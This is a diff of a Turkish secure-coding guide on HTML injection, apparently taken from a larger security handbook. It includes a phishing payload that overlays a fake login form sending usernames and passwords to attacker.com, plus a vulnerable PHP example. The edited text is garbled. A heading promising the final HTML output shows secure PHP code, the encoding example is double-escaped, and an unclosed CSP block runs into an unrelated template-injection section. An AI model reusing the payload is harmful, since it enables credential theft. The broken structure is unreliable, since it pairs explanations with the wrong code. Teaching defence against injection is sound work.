@@ -813,30 +813,39 @@ Web uygulamasının, Active Directory veya OpenLDAP sunucusuna bağlanırken (*L
 
 ### 3. Güvenli Hata Yönetimi ve Bilgi Sızıntısının Önlenmesi
 LDAP bağlantı veya sorgu hataları (örneğin *"Bad Search Filter"*, *"Size Limit Exceeded"* veya sürücü kaynaklı hata kodları) canlı sistemlerde asla son kullanıcıya yansıtılmamalıdır. Saldırganlar bu detaylı hata mesajlarını, arka plandaki LDAP şemasını, nesne sınıflarını (*Object Classes*) ve öznitelik (*Attribute*) isimlerini keşfetmek amacıyla bir haritalama aracı olarak kullanırlar. Hata mesajları arka planda merkezi ve güvenli bir log sunucusuna yazılmalı, istemciye ise her zaman standart ve jenerik bir yanıt dönülmelidir.
-# 9. HTML Injection
+## 9. HTML Injection
 
 Uygulamanın kullanıcıdan aldığı girdileri yeterli doğrulama, temizleme veya kodlama işlemlerinden geçirmeden doğrudan HTML kaynak koduna dahil etmesi sonucu oluşan zafiyet türüne **HTML Injection (HTML Enjeksiyonu)** denir.
 
-Cross-Site Scripting (XSS) zafiyeti ile doğrudan kardeş bir yapıya sahiptir. Ancak aralarındaki temel fark sömürü odağıdır: XSS saldırılarında birincil amaç tarayıcı üzerinde zararlı JavaScript kodları yürütmek (*execution*) iken, HTML Injection saldırılarında amaç sayfanın Belge Nesnesi Modelini (DOM) manipüle ederek görsel yapıyı, form elemanlarını ve statik metin içeriğini değiştirmektir. Saldırganlar bu zafiyeti genellikle sahte giriş formları oluşturarak kullanıcı kimlik bilgilerini çalmak (*phishing*), site içeriğini tahrif etmek (*deface*) veya kullanıcıları harici zararlı bağlantılara yönlendirmek amacıyla kullanırlar.
+>  **XSS ile İlişkisi:** Cross-Site Scripting (XSS) zafiyeti ile doğrudan kardeş bir yapıya sahiptir. 
+
+### Aralarındaki Temel Fark Nedir?
+*   **XSS:** Birincil amaç tarayıcı üzerinde zararlı JavaScript kodları yürütmektir (*execution*).
+*   **HTML Injection:** Amaç sayfanın Belge Nesnesi Modelini (DOM) manipüle ederek görsel yapıyı, form elemanlarını ve statik metin içeriğini değiştirmektir. 
+
+Saldırganlar bu zafiyeti genellikle sahte giriş formları oluşturarak kullanıcı kimlik bilgilerini çalmak (**phishing**), site içeriğini tahrif etmek (**deface**) veya kullanıcıları harici zararlı bağlantılara yönlendirmek amacıyla kullanırlar.
 
 ---
 
-## HTML Enjeksiyon Türleri ve Teknik Anatomisi
+###  HTML Enjeksiyon Türleri ve Teknik Anatomisi
 
 HTML Injection zafiyeti, zararlı kodun sunucu tarafından işlenme ve istemciye ulaştırılma biçimine göre iki ana başlık altında incelenir:
 
-*   **Stored HTML Injection (Kalıcı):** Saldırganın enjekte ettiği kötü niyetli HTML etiketleri, uygulamanın veri tabanı, dosya sistemi veya log blokları gibi kalıcı veri saklama katmanlarına kaydedilir. Sayfayı ziyaret eden her meşru kullanıcı, sunucudan gelen bu manipüle edilmiş veriyi yükler ve tarayıcı yerleştirilen sahte etiketleri sitenin orijinal tasarımıymış gibi işler.
-*   **Reflected HTML Injection (Yansıtılan):** Zararlı HTML içeriği veri tabanına kaydedilmez. Saldırgan, URL parametreleri veya HTTP istek gövdeleri (*Request Body*) içerisine yerleştirdiği etiketleri sunucuya gönderir; sunucu gelen bu girdiyi kontrol etmeden yanıt (*Response*) sayfasına aynen yansıtır. Saldırının başarıya ulaşması için kurbanın hazırlanan manipülatif bağlantıya tıklatılması gerekir.
+#### 1. Stored HTML Injection (Kalıcı)
+Saldırganın enjekte ettiği kötü niyetli HTML etiketleri; uygulamanın veri tabanı, dosya sistemi veya log blokları gibi **kalıcı veri saklama katmanlarına** kaydedilir. Sayfayı ziyaret eden her meşru kullanıcı, sunucudan gelen bu manipüle edilmiş veriyi yükler ve tarayıcı yerleştirilen sahte etiketleri sitenin orijinal tasarımıymış gibi işler.
 
-Saldırganlar, yerleştirdikleri `<div>`, `<iframe>`, `<form>` veya `<meta>` gibi etiketler vasıtasıyla sayfa üzerine görünmez katmanlar ekleyebilir, mevcut formların hedef adreslerini (*action*) kendi sunucularına yönlendirebilir ya da sayfayı tamamen okunamaz hale getirebilirler.
+#### 2. Reflected HTML Injection (Yansıtılan)
+Zararlı HTML içeriği veri tabanına kaydedilmez. Saldırgan, URL parametreleri veya HTTP istek gövdeleri (*Request Body*) içerisine yerleştirdiği etiketleri sunucuya gönderir; sunucu gelen bu girdiyi kontrol etmeden yanıt (*Response*) sayfasına aynen yansıtır. Saldırının başarıya ulaşması için kurbanın hazırlanan manipülatif bağlantıya tıklatılması gerekir.
+
+>  **Saldırı Vektörleri:** Saldırganlar yerleştirdikleri `<div>`, `<iframe>`, `<form>` veya `<meta>` gibi etiketler vasıtasıyla sayfa üzerine görünmez katmanlar ekleyebilir, mevcut formların hedef adreslerini (*action*) kendi sunucularına yönlendirebilir ya da sayfayı tamamen okunamaz hale getirebilirler.
 
 ---
 
-## Kod Örnekleri
+###  Kod Örnekleri
 
-### Hatalı ve Savunmasız Kod (Vulnerable Code)
-
+####  Hatalı ve Savunmasız Kod (Vulnerable Code)
 Aşağıdaki PHP örneğinde, bir kullanıcı profilindeki "Hakkımda" veya "Biyografi" alanını ekrana basan güvensiz bir uygulama yapısı yer almaktadır. Yazılımcı, veri tabanından veya doğrudan istekle gelen veriyi hiçbir süzgeçten geçirmeden tarayıcıya göndermektedir:
+
 
 ```php
 <?php
@@ -847,41 +856,135 @@ $bioInput = $_POST['biography'];
 echo "<div class='user-bio'>" . $bioInput . "</div>";
 ?>
 ```
-### Saldırı Senaryosu (Phishing / Form Injection)
-```html
+
+###  Saldırı Senaryosu (Phishing / Form Injection)
+
 Saldırgan, biyografi alanına düz bir metin yazmak yerine, sayfaya sahte bir oturum yenileme formu yerleştiren şu zararlı HTML bloklarını enjekte eder:
+
+
+
+```html
 </div>
-<div style="position:fixed; top:0; left:0; width:100%; height:100%; background:white; z-index:9999; padding:50px;">
-  <h2>Oturumunuz Sonlandı. Lütfen Tekrar Giriş Yapın:</h2>
-  <form action="http://attacker.com/collect.php" method="POST">
-    Kullanıcı Adı: <input type="text" name="user"><br>
-    Şifre: <input type="password" name="pass"><br>
-    <input type="submit" value="Giriş Yap">
-  </form>
+<div style="position:fixed; top:0; left:0; width:100%; height:100%; background:white;">
+    <h2>Oturumunuz Sonlandı. Lütfen Tekrar Giriş Yapın:</h2>
+    <form action="[http://attacker.com/collect.php](http://attacker.com/collect.php)" method="POST">
+        Kullanıcı Adı: <input type="text" name="user"><br>
+        Şifre: <input type="password" name="pass"><br>
+        <input type="submit" value="Giriş Yap">
+    </form>
 </div>
 <div>
+
 ```
-# Uygulamanın arka planda birleştirerek tarayıcıya gönderdiği nihai HTML çıktısı şu şekle bürünür:
-```html
-<div class='user-bio'></div><div style="position:fixed; top:0; left:0; ...">...</div><div></div>
-```
-Tarayıcı bu kodu işlediğinde, saldırganın en başta açtığı </div> etiketi orijinal div'i erkenden kapatır. Ardından gelen yüksek öncelikli (z-index: 9999) ve ekranı tamamen kaplayan tam ekran beyaz div katmanı meşru sitenin üzerine biner. Kullanıcı, karşılaştığı sahte formu orijinal sitenin bir oturum zaman aşımı uyarısı zannederek bilgilerini girer ve gönder (submit) butonuna bastığında şifre verileri doğrudan saldırganın sunucusuna (attacker.com) transfer edilir.
 
 
 
-Doğru ve Güvenli Kod (Secure Code)
 
-HTML Injection saldırılarını engellemenin en kesin ve birincil yöntemi, kullanıcıdan alınan verileri tarayıcıya göndermeden önce kesinlikle Bağlama Duyarlı Çıktı Kodlaması (Context-Aware Output Encoding) mimarisinden geçirmektir. HTML gövdesine yazılacak veriler kodlandığında, tarayıcı etiket açma ve kapama sembollerini birer HTML komutu olarak çalıştırmaz, sadece saf bir metin verisi olarak ekrana yansıtır.
+
+
+
+
+
+
+
+
+
+###  Nihai HTML Çıktısı ve Tarayıcı Davranışı
+
+Uygulamanın arka planda birleştirerek tarayıcıya gönderdiği nihai HTML çıktısı şu şekle bürünür:
+
 ```php
 <?php
 // Kullanıcıdan gelen biyografi metni alınıyor
 $bioInput = $_POST['biography'];
 
-// GÜVENLİ YAPI: htmlspecialchars fonksiyonu ile tüm özel karakterler HTML varlıklarına dönüştürülüyor
-// ENT_QUOTES ve UTF-8 parametreleri ile tam bir karakter dönüşüm güvenliği sağlanır
+// GÜVENLİ YAPI: htmlspecialchars fonksiyonu ile tüm özel karakterler HTML varlıklarına dönüştürülür.
+// ENT_QUOTES ve UTF-8 parametreleri ile tam bir karakter dönüşüm güvenliği sağlanır.
 $secureBio = htmlspecialchars($bioInput, ENT_QUOTES, 'UTF-8');
 
 echo "<div class='user-bio'>" . $secureBio . "</div>";
 ?>
 ```
-Bu kodlama işlemi uygulandığında, saldırganın enjekte etmeye çalıştığı <form> karakteri tarayıcıya &lt;form&gt; şeklinde ulaşır. Tarayıcı bu ifadeyi gördüğünde ekranda görsel olarak <form> metnini çizer ancak arka planda herhangi bir form nesnesi veya katman oluşturmaz.
+
+
+
+
+
+Bu kodlama işlemi uygulandığında, saldırganın enjekte etmeye çalıştığı `&lt;form&gt;` karakteri tarayıcıya `&amp;lt;form&amp;gt;` şeklinde ulaşır. Tarayıcı bu ifadeyi gördüğünde ekranda görsel olarak `"<form>"` metnini çizer ancak arka planda herhangi bir form nesnesi veya katman oluşturmaz.
+
+---
+
+##  Savunma Katmanları (Defense-in-Depth)
+
+Çıktı kodlamasının yanı sıra, sistem bütünlüğünü korumak ve enjeksiyon risklerini minimize etmek amacıyla şu derinlemesine savunma katmanları entegre edilmelidir:
+
+### 1. HTML Sanitization (HTML Temizleme)
+Uygulama iş mantığı gereği kullanıcıların zengin metin editörleri (*Rich Text Editors*) vasıtasıyla kalın yazı (`<b>`), italik yazı (`<i>`) veya köprü metni (`<a>`) gibi sınırlı HTML etiketlerini kullanması zorunlu olabilir. Bu gibi durumlarda çıktı kodlaması yapmak kullanıcın biçimlendirmelerini tamamen bozacaktır.
+
+*   **Çözüm:** Girdi, beyaz liste (*whitelisting*) mantığına dayalı çalışan güvenilir kütüphaneler (örneğin arka planda **HTMLPurifier**, istemci tarafında **DOMPurify**) ile temizleme (*sanitization*) işlemine tabi tutulmalıdır. 
+*   **İşleyiş:** Bu kütüphaneler sadece izin verilen güvenli etiketlerin geçişine onay verirken; tehlikeli kabul edilen `<form>`, `<iframe>`, `<script>`, `<meta>` gibi etiketleri ve stil manipülasyonuna açık güvensiz CSS niteliklerini tamamen ayıklar.
+
+### 2. HTTPOnly ve Secure Çerez Bayrakları (Cookie Flags)
+HTML Injection açığı bulunan bir sayfada saldırgan, doğrudan JavaScript kodu çalıştıramasa dahi, HTML etiketlerinin yeteneklerini kullanarak (*örneğin resim yükleme etiketinin hata yöneticilerini manipüle ederek: `<img src="x" onerror="zararlı_kod">`*) saldırıyı bir XSS varyasyonuna dönüştürebilir.
+
+*   **Çözüm:** Oturum çerezleri sunucu tarafında yapılandırılırken `HttpOnly` ve `Secure` bayrakları aktif edilmelidir. 
+*   **HttpOnly:** Tarayıcı üzerindeki olası script sızmalarının çerez verilerine erişmesini engeller.
+*   **Secure:** Çerezin yalnızca şifrelenmiş **HTTPS** bağlantıları üzerinden taşınmasını zorunlu kılar.
+
+### 3. İçerik Güvenlik Politikası (CSP - Content Security Policy)
+Web sunucusu tarafından HTTP yanıt başlığı (*Header*) olarak istemciye iletilen CSP talimatları, HTML Injection sömürülerinin etkisini büyük oranda sınırlar.
+
+#### Örnek bir koruyucu CSP direktifi:
+```http
+Content-Security-Policy: default-src 'self'; form-action 'self'; frame-src 'none';
+
+
+
+```python
+from flask import Flask, request, render_template_string
+
+app = Flask(__name__)
+
+@app.route("/welcome")
+def welcome():
+    # Kullanıcıdan gelen isim parametresi alınıyor
+    user_name = request.args.get('name', 'Misafir')
+    
+    # GÜVENLİ YAPI: Şablon metni tamamen statik ve sabittir
+    # Dinamik gelecek olan veri yer tutucu (placeholder) bir değişken ile belirtilir
+    template = "<html><body><h1>Hoş geldiniz, {{ name_param }}!</h1></body></html>"
+    
+    # Kullanıcı girdisi şablon motoruna güvenli bir context değişkeni olarak paslanır
+    # Bu mimaride name_param içerisine ne yazılırsa yazılsın sadece düz bir metin olarak yorumlanır
+    return render_template_string(template, name_param=user_name)
+
+if __name__ == "__main__":
+    app.run()
+
+
+```
+
+
+
+
+##  Savunma Katmanları (Defense-in-Depth)
+
+Şablon tabanlı mimarilerde güvenliği pekiştirmek adına şu ek koruma katmanları devreye alınmalıdır:
+
+### 1. Girdi Doğrulama ve Sıkı Beyaz Liste Kontrolü
+Uygulamaya kabul edilecek kullanıcı girdileri, şablon motorlarının özel karakter sözdizimlerine karşı taranmalıdır. 
+
+*   **Regex Filtreleme:** Eğer parametre alanında süslü parantezler (`{`, `}`), dolar işareti (`$`), yüzde işareti (`%`) veya nokta (`.`) gibi nesne erişim karakterlerinin bulunması iş mantığı açısından gerekmiyorsa, bu karakterleri içeren istekler düzenli ifadeler (*Regex*) ile daha en başta filtrelenmeli ve reddedilmelidir.
+
+### 2. Mantıksız (Logic-less) Şablon Motorlarının Tercih Edilmesi
+Eğer uygulamanın tasarım katmanında gelişmiş döngülere, nesne fonksiyon çağrılarına veya programlama dili metotlarına ihtiyaç duyulmuyorsa, mimari olarak **"Logic-less"** (mantıksal yeteneği kısıtlı) şablon motorları tercih edilmelidir.
+
+*   **Örnek Motorlar:** [Mustache](https://mustache.github.io/) veya [Handlebars](https://handlebarsjs.com/)
+*   **Avantajı:** Bu motorlar, yapıları gereği karmaşık kod bloklarını veya sistem sınıflarını çalıştırma yeteneğine sahip olmadıklarından, enjeksiyon durumlarında bile siber saldırganların RCE (Remote Code Execution) elde etmesini doğrudan engeller.
+
+### 3. Uygulama İzolasyonu ve Kısıtlı Çalışma Zamanı (Sandboxing)
+Şablon motorlarının çalıştırıldığı sunucu süreçleri ve uygulama katmanları mutlaka izole edilmelidir.
+
+*    **Korumalı Alan (Sandbox Mode):** Kullanılan şablon motorunun eğer mevcutsa güvenli çalışma modu (*örneğin Twig için Sandbox Extension*) aktif edilmelidir. Bu mod, şablonlar içerisinde sadece belirli güvenli fonksiyonların ve etiketlerin çalıştırılmasına izin verir, sunucu sınıflarına erişimi engeller.
+*    **İşletim Sistemi İzolasyonu:** Uygulama, en az yetki (*least privilege*) ilkesine uygun olarak sistemde root haklarına sahip olmayan düşük yetkili bir kullanıcı ile çalıştırılmalı ve **Docker** benzeri bir konteyner yapısı içinde izole edilmelidir. Böylece bir enjeksiyon açığı yaşansa dahi, saldırganın ana sunucu işletim sistemine sızması ve kalıcı zarar vermesi sınırlandırılmış olur.
+
